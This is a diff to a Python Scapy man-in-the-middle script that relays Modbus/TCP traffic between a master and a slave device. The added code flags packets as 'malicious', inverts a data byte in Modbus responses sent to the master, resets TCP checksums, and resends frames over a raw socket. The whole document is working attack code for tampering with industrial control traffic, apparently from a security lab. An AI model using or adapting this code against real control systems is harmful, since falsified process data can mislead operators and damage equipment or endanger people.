@@ -24,6 +24,8 @@ slave_mac       = 'b8:27:eb:1e:08:59' # b8:27:eb:1e:08:59
 MIM_mac         = '8c:04:ba:08:73:03' # 8c:04:ba:08:73:03
 
 packet_num=0
+# indicate that we just send malicious packet and next ack should be modified 
+malicious=False
 
 # Define the function that will be called for each received packet
 def handle_packet(packet):
@@ -43,20 +45,24 @@ def handle_packet(packet):
         ## these destination is master 
         if packet[Ether].src == slave_mac:
             packet = packet_for_master(packet)
+            malicious=False
         ## these destination is .252 
         elif packet[Ether].src == real_master_mac:
             packet = packet_for_slave(packet)
         else:
-           return
-   
-    # modify each nth packet that is going to slave 
-    if packet[Ether].dst == slave_mac: 
-        packet_num += 1
-        if packet_num % MODIFY_NTH_PACKET == 0:
-            packet = change_packet(packet)
+            return
+    
 
-    # send packet 
-    sendp(packet, iface=listen_interface)
+    # modify each nth packet that is going to slave 
+   # if packet[Ether].dst == slave_mac: 
+   #     packet_num += 1
+   #     if packet_num % MODIFY_NTH_PACKET == 0:
+   #         packet = change_packet(packet)
+   #         malicious=True
+
+
+    # send packet
+    s.send(bytes(packet))
 
 ## Change data part of modbus packet 
 def change_packet(packet):
@@ -98,6 +104,25 @@ def packet_for_master(packet):
     packet[Ether].dst = real_master_mac
     packet[Ether].src = MIM_mac 
     
+    if malicious == True:
+    
+        if len(packet[TCP].payload) != 12:
+            return packet 
+        
+        tcp_payload = packet[TCP].payload.load
+        
+        ## 11-12 byte is data 
+        byte_index = 10 # 0-based indexing
+        inverted_byte = bytes([~tcp_payload[byte_index] & 0xff])
+        tcp_payload = tcp_payload[:byte_index] + inverted_byte + tcp_payload[byte_index+1:]
+        
+        # Update the packet with the modified payload
+        packet[TCP].payload.load = bytes(tcp_payload)
+       
+        # Recalculate TCP checksum
+        del packet[TCP].chksum
+        packet[TCP].chksum_relaxed = 0 
+
     return packet 
 
 # prepare packet that has slave destination 
@@ -109,7 +134,12 @@ def packet_for_slave(packet):
     packet[Ether].dst = slave_mac
     packet[Ether].src = MIM_mac 
     
+    
+
     return packet 
+
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+s.bind((listen_interface, 0))
 
 # Start sniffing packets on the listen interface and call the handle_packet function for each packet received
 sniff(iface=listen_interface, prn=handle_packet)
